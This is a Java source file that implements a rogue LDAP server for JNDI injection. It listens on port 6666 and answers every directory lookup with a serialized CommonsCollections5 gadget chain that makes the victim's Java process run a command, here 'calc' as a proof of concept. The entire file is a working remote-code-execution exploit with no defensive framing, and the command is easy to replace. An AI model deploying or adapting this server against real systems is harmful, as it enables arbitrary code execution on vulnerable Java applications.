package com.qxx.common.service;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.UnknownHostException;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.locks.Lock;
import java.util.concurrent.locks.ReentrantReadWriteLock;

public class LDAPServer {

    private static final String LDAP_BASE = "dc=example,dc=com";

    public static void main(String[] tmp_args) throws LDAPException, UnknownHostException, MalformedURLException {
        ReentrantReadWriteLock rwlock = new ReentrantReadWriteLock();
        rwlock.readLock();

        String[] args = new String[]{"http://127.0.0.1/#test"};
        int port = 6666;
        InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
        config.setListenerConfigs(new InMemoryListenerConfig(
                "listen", //$NON-NLS-1$
                InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                port,
                ServerSocketFactory.getDefault(),
                SocketFactory.getDefault(),
                (SSLSocketFactory) SSLSocketFactory.getDefault()));
        config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[0])));

        System.out.println();
        InMemoryDirectoryServer inMemoryDirectoryServer = new InMemoryDirectoryServer(config);
        System.out.println("Listening on 0.0.0.0:" + port); //$NONNLS-1$
        inMemoryDirectoryServer.startListening();


    }


    private static class OperationInterceptor extends InMemoryOperationInterceptor{
        private URL codeBase;

        public OperationInterceptor(URL cb){
            this.codeBase = cb;
        }

        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String base = result.getRequest().getBaseDN();
            Entry entry = new Entry(base);
            try {
                sendResult(result,base,entry);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) throws Exception {
            URL url = new URL(this.codeBase, this.codeBase.getRef().replace(".", "/").concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + url);
            e.addAttribute("javaClassName", "foo");
            String cbstring = this.codeBase.toString();
            int refPos = cbstring.indexOf('#');
            if ( refPos > 0 ) {
                cbstring = cbstring.substring(0, refPos);
            }
            e.addAttribute("javaSerializedData",CommonsCollections5());
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));

        }

        private static byte[] CommonsCollections5() throws Exception{
            Transformer[] transformers=new Transformer[]{
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[]{}}),
                    new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[]{}}),
                    new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
            };
            ChainedTransformer chainedTransformer=new
                    ChainedTransformer(transformers);
            Map map=new HashMap();
            Map lazyMap= LazyMap.decorate(map,chainedTransformer);
            TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,"test");
            BadAttributeValueExpException badAttributeValueExpException=new BadAttributeValueExpException(null);
            Field field=badAttributeValueExpException.getClass().getDeclaredField("val");
            field.setAccessible(true);
            field.set(badAttributeValueExpException,tiedMapEntry);
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
            objectOutputStream.writeObject(badAttributeValueExpException);
            objectOutputStream.close();
            return byteArrayOutputStream.toByteArray();
        }
    }
}
